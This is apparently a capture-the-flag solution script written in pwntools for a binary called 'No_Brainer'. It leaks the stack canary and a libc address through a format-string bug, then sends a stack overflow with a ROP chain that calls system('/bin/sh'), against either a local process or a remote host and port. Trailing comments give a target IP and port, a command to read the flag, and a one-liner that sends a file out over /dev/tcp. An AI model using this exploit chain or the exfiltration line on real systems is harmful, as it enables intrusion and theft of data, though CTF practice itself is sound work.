from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
if len(sys.argv) == 1:
    r = process("./No_Brainer_patched")
    if args.GDB:
        gdb.attach(r,'brva 0x14d3')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
r.sendafter(b"Guest Name:", b"Yvette" + b'%23$p%25$p' + b'\x01') # len fmt = 10
r.recvuntil(b'ette')
r.recvuntil(b'0x')
canary = int(r.recvuntil(b'0x')[:-2].decode(),16)
print(f"canary: {hex(canary)}")
libc = int(r.recvuntil(b'\x01')[:-1].decode(),16) - 0x24083
print(f"libc: {hex(libc)}")
bin_sh = libc + 0x1b45bd
system = libc + 0x0000000000052290
pop_rdi = libc + 0x0000000000023b6a
ret = libc + 0x0000000000022679
r.sendlineafter(b"Where are you going: ", b'\x00' + cyclic(0x38-1) + p64(canary) + p64(0xCAFEBABE) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system))
r.interactive()

'''
Writeup:
34.80.164.161 33333
'''


'''
aoaaapaa
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''